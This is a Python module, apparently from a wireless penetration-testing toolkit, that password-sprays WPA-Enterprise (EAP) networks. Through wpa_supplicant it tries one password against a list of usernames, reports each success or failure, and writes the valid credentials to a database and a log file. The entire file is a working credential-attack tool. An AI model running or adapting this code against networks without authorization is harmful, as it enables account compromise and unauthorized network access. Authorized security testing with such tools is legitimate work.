# Module: eapspray.py
# Description: Performs a Spray Brute-force attack against the Extensible Authentication Protocol (EAP)
# The Eapspray module is tailored to spray a list of usernames against a single password guess.
# Author: Nick Sanzotta/@Beamr
# Version: v 1.09282017
try:
	import os, sys, threading, datetime, time
	from wpa_supplicant.core import WpaSupplicantDriver
	from twisted.internet.selectreactor import SelectReactor
	from twisted.internet import task
	from theme import *
	from dbcommands import DB
except Exception as e:
	print('\n [!] EAPSPRAY - Error: ' % (e))
	sys.exit(1)


class eapSpray(threading.Thread):
	def __init__(self, db_path, ssid, user, userList, password, ca_cert, ca_path, client_cert, supplicantInt, interface):
		threading.Thread.__init__(self)
		self.setDaemon(1) # daemon
		self.ssid = ssid
		self.user = user
		self.userList = userList # original userList prior to Queue_user, used to enumerate user count.
		self.password = password
		self.ca_cert = ca_cert
		self.ca_path = ca_path
		self.client_cert = client_cert
		self.supplicantInt = supplicantInt
		self.interface = interface
		self.log_timestamp = '{:%Y-%m-%d_%H:%M:%S}'.format(datetime.datetime.now())
		self.eapcreds_log = 'data/eapcreds/%s_%s.eapcreds' % (self.ssid, self.log_timestamp)
		self.db_path = db_path

	def run(self):
		self.database_connect() # Connect to database
		self.datafolders_check()
		# Time Stamp for file creation
		timestr = time.strftime("%Y%m%d-%H%M")
		# Time Stamp for entire credential spray
		curr_time1 = time.time()
		# Container of successfully authenticated user
		successList = []
		# Count number of users in list
		user_list_length = len(self.userList)

		while not self.user.empty():

			cls()
			banner()
			user_counter = 0
			for user in self.user.get():
				user_counter +=1
				# Time Stamp for each user
				curr_time2 = time.time()
				network_cfg = {
				        "disabled": 0, 
				        "ssid": self.ssid,
				        "scan_ssid":1,
				        "mode": 0,
				        "key_mgmt": "WPA-EAP IEEE8021X",
				        "pairwise": "CCMP TKIP",
				        "eap": "MD5 MSCHAPV2 OTP GTC TLS PEAP TTLS",
				        "identity": user,
				        "password": self.password,
				        # "ca_cert": ca_cert,
				        # "ca_path": ca_path,
				        # "client_cert": client_cert,
				        "phase1": "peapver=0", 
				        "phase2": "auth=MSCHAPV2",	

				}	

				# Conf Added
				self.interface.add_network(network_cfg)	

				# Connect to Network Profile 0
				self.interface.select_network(self.supplicantInt+'/Networks/0')	

				# print('DEBUG: WPA CONF')
				# print(interface.get_current_network())	
				while True:
					if self.interface.get_state() == 'completed':
						print(' Brute-forcing SSID : ' + ' ' + self.ssid)
						print(' Testing Credentials: ' + ' ' + user + ':' + self.password)
						print(' Interface          : ' + ' ' + self.interface.get_ifname())
						print(' Interface Status   : ' + ' ' + self.interface.get_state())
						print(' Authentication     : ' + ' Success: '+ colors.green + '[!]' + colors.normal)
						print(' Elapsed Time       :  %.1fs' % (time.time() - curr_time2))
						print(' Attempts           :  [%s/%s]\n' % (user_counter, user_list_length))
						userSuccess = user + ":" + self.password
						successList.append(userSuccess)
						try:
							self.db.eapspray_commit(self.ssid, user, self.password)
						except Exception as e:
							print(red('!')+'WARNING - (EAPSPRAY) Could not save to database: %s' % (e))
							pass
						# Remove from associated network, which results in state: 'inactive'
						self.interface.remove_network(self.supplicantInt+'/Networks/0')
						# Wait for inactive state, based on a timer.
						time.sleep(7)
					elif self.interface.get_state() == 'disconnected':
						print(' Brute-forcing SSID : ' + ' ' + self.ssid)
						print(' Testing Credentials: ' + ' ' + user + ":" + self.password)
						print(' Interface          : ' + ' ' + self.interface.get_ifname())
						print(' Interface Status   : ' + ' ' + self.interface.get_state())
						print(' Authentication     : ' + ' Failed: '+ colors.red + '[!]' + colors.normal)
						print(' Elapsed Time       :  %.1fs ' % (time.time() - curr_time2))
						print(' Attempts           :  [%s/%s]\n' % (user_counter, user_list_length))
						# Remove from associated network, which results in state: 'inactive'
						self.interface.remove_network(self.supplicantInt+'/Networks/0')
						# Wait for inactive state, based on a timer.
						time.sleep(7)
					elif self.interface.get_state() == 'inactive':
						break

			cls()
			banner()
			try:
				print(normal('*')+'Completed in: %.1fs' % (time.time() - curr_time1))
				print(normal('*')+'SSID Brute-forced: %s' % (self.ssid))
				print(normal('*')+'Password Sprayed: %s' % (self.password))
				print(normal('*')+'Accounts Tested: [%s]' % (user_list_length))
				print(normal('*')+'Password(s) Guessed: [%s/%s]' % (len(successList),user_list_length))
				
				if len(successList):
					print('\n'+normal('*')+'EAP Creds Log: %s' % (self.eapcreds_log))
					for users in successList:
						print(green('*')+users)
						with open(self.eapcreds_log, 'a+') as f1:
							f1.write(users+'\n')
				else:
					print(normal('*')+'No EAP Credentials Discovered')

			except UnboundLocalError as e:
				print(red('!')+'Error: %s' % (e))	
	
			self.user.task_done()

	def datafolders_check(self):
		# Creates eapcreds folder(s) if missing
		eapcreds_directory = 'data/eapcreds'
		if not os.path.exists(eapcreds_directory):
			os.makedirs(eapcreds_directory)

	def database_connect(self):
		try:
			self.db = DB(self.db_path)
		except Exception as e:
			print(red('!')+'WARNING - (EAPSPRAY) Could not connect to database: %s' % (e))
			pass